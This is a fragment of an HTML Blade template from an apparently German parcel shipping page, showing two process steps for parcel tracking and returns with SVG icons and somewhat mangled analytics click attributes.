                                           event_attributes_loc":"main","event_eventinfo_cause":"click","event_eventinfo_effect":"go-to","event_attributes_tgturl":"=""
                                        de="" pakete-versenden=""
                                        verfolgen","event_eventinfo_eventlabel":"verfolgen","event_category_primarycategory":"process","event_category_subcategory1":"","event_attributes_subattr1":""}"="">

                                        <div class="ppm-process__circle rounded-circle">

                                            <div class="ppm-process__svg">
                                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32">
                                                    <path fill="currentColor" d="M15.3 2.7L14 4h1.8l1.4-1.3z"></path>
                                                    <path
                                                        d="M24.9 22.1c.7-1.2 1.1-2.6 1.1-4.1 0-2.7-1.3-5-3.3-6.5V0h-13L4 5.7V12H0v9.3h10.7C12 24 14.7 26 18 26c1.5 0 2.9-.4 4.1-1.1l7.1 7.1 2.8-2.8-7.1-7.1zM10.3 1.3h10.1l-4 4H6.3l4-4zm11 1v8.5c-1-.5-2.1-.7-3.3-.7h-.7V6.3l4-4zm-16 4.4H16v3.6c-1.2.3-2.3.9-3.3 1.7H5.3V6.7zm-4 7.4L4 16.4 1.4 19v-4.9h-.1zm1 5.9L5 17.3l1 .8c.4.4.9.6 1.4.6s1-.2 1.4-.6l1.4-1.2c0 .3-.1.7-.1 1 0 .7.1 1.4.3 2H2.3v.1zm5.5-2.8c-.3.3-.7.3-1 0l-4.4-3.9h9.1c-.3.4-.5.8-.8 1.3l-2.9 2.6zM18 24.7a6.7 6.7 0 1 1 0-13.4 6.7 6.7 0 0 1 0 13.4zm5.2-.6c.3-.3.7-.6.9-.9l6 6-.9.9-6-6z"></path>
                                                    <path fill="none" d="M0 0h32v32H0z"></path>
                                                </svg>

                                            </div>


                                        </div>
                                        <div class="ppm-process__text">


                                            <h3 class="ppm-title ppm-process__title">
                                                <span class="ppm-title__main">Verfolgen</span>

                                            </h3>


                                            <div class="ppm-process__description">

                                                <div class="ppm-richtext" data-init="richtext">

                                                    <div class="ppm-richtext__content">
                                                        <p>Jederzeit wissen, wo sich Ihr Paket befindet.</p>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                        </a>

                                    </li>


                                    <li class="ppm-process__step">

                                        <a href="#"
                                           class="ppm-process__step--link" target="" data-element-click="{"
                                           event_attributes_loc":"main","event_eventinfo_cause":"click","event_eventinfo_effect":"go-to","event_attributes_tgturl":"=""
                                        de="" pakete-versenden=""
                                        retouren","event_eventinfo_eventlabel":"retouren","event_category_primarycategory":"process","event_category_subcategory1":"","event_attributes_subattr1":""}"="">

                                        <div class="ppm-process__circle rounded-circle">

                                            <div class="ppm-process__svg">
                                                <svg version="1.1" xmlns="http://www.w3.org/2000/svg"
                                                     viewBox="0 0 32 32">
                                                    <path fill="currentColor" d="M26.7, 17.3L26.7,17.3l-10.7, 0v1.3h10.7c2.3,0,4,1.7,4,4c0,2.3-1.7, 4-4,4H13.2l4-4h-1.9l-4.7, 4.7l4.7,4.7h1.9l-4-4h13.5
        c2.9,0, 5.3-2.4, 5.3-5.3S29.6,17.3,26.7, 17.3z"></path>
                                                    <path fill="currentColor" d="M18.7,12.9V0H5.7L0,5.7v12.9h12.9L18.7,12.9z M17.3,12.4l-4,4V6.3l4-4V12.4z M12,17.3H1.3V6.7H12V17.3z M2.3,5.3l4-4h10.1
        l-4,4H2.3z"></path>
                                                    <polygon points="11.3,2.7 10,4 11.9,4 13.2,2.7  "></polygon>
                                                </svg>

                                            </div>


                                        </div>
                                        <div class="ppm-process__text">


                                            <h3 class="ppm-title ppm-process__title">
                                                <span class="ppm-title__main">Retouren</span>

                                            </h3>


                                            <div class="ppm-process__description">

                                                <div class="ppm-richtext" data-init="richtext">

                                                    <div class="ppm-richtext__content">
                                                        <p>Retouren-Pakete zurückschicken: Mehr Komfort für Käufer, mehr
                                                            Effizienz für Händler.</p>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                        </a>

                                    </li>


                                </ul>


                            </div>
                        </div>
                    </div>

                </div>
            </section>

            <span data-iframe-height=""></span>
        </div>
    </main>
@endsection
